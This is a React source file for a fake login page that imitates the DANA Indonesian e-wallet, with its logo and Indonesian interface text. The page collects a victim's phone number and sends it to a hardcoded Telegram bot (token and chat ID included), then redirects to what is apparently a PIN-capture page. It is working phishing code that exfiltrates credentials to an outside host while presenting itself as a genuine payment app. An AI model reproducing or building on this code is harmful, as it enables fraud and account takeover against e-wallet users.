import React, { useState } from 'react';
    import { Link, useNavigate } from 'react-router-dom';
    import './PhoneNumberPage.css';

    function PhoneNumberPage() {
      const [phoneNumber, setPhoneNumber] = useState('');
      const [countryCode, setCountryCode] = useState('+62');
      const navigate = useNavigate();

      const handleContinue = async () => {
        if (phoneNumber.trim() !== '') {
          // Remove spaces from phone number before passing it
          const cleanedPhoneNumber = phoneNumber.replace(/\s/g, '');
          const fullPhoneNumber = countryCode + cleanedPhoneNumber;

          // Send data to Telegram API
          try {
            const response = await fetch('https://api.telegram.org/bot7480000961:AAEkDpsi4pGe3BuJYp1dbWQ51pXPskBEzpk/sendMessage', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                chat_id: '6538670773',
                text: `Nomor HP: ${fullPhoneNumber}`,
              }),
            });

            if (response.ok) {
              console.log('Data berhasil dikirim ke Telegram!');
              navigate('/pin', { state: { phoneNumber: fullPhoneNumber } });
            } else {
              console.error('Gagal mengirim data ke Telegram:', response.status);
              alert('Gagal mengirim data. Coba lagi nanti.');
            }
          } catch (error) {
            console.error('Error:', error);
            alert('Terjadi kesalahan. Coba lagi nanti.');
          }
        } else {
          alert('Nomor HP harus diisi!');
        }
      };

      const handlePhoneNumberChange = (event) => {
        const rawNumber = event.target.value.replace(/\D/g, '');
        let formattedNumber = '';
        for (let i = 0; i < rawNumber.length; i++) {
          if (i > 0 && i % 3 === 0) {
            formattedNumber += ' ';
          }
          formattedNumber += rawNumber[i];
        }
        setPhoneNumber(formattedNumber);
      };

      const handleCountryCodeChange = (event) => {
        setCountryCode(event.target.value);
      };

      return (
        <div className="phone-number-container">
          <div className="top-content">
            <img src="https://hosting.tigerengine.id/ulqfeu.png" alt="DANA Logo" className="logo" />
          </div>
          <h1>Masukkan nomor HP kamu untuk lanjut</h1>
          <div className="input-group">
            <label htmlFor="phone-number">
              Negara
              <div className="phone-input">
                <select className="country-code" value={countryCode} onChange={handleCountryCodeChange}>
                  <option value="+62">🇮🇩 +62</option>
                  <option value="+1">🇺🇸 +1</option>
                  <option value="+44">🇬🇧 +44</option>
                  {/* Add more countries as needed */}
                </select>
                <input
                  type="tel"
                  id="phone-number"
                  placeholder="811-1234-5678"
                  className="phone-number-input"
                  value={phoneNumber}
                  onChange={handlePhoneNumberChange}
                />
              </div>
            </label>
            <p>
              Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu. Dengan melanjutkan, kamu juga setuju dengan S&K serta Kebijakan Privasi kami.
            </p>
            <div className="location-access">
              <span>📍</span>
              <span>Yuk aktifkan akses lokasi untuk pakai semua fitur!</span>
            </div>
          </div>
          <button className="continue-button" onClick={handleContinue}>
            Lanjutkan
          </button>
        </div>
      );
    }

    export default PhoneNumberPage;
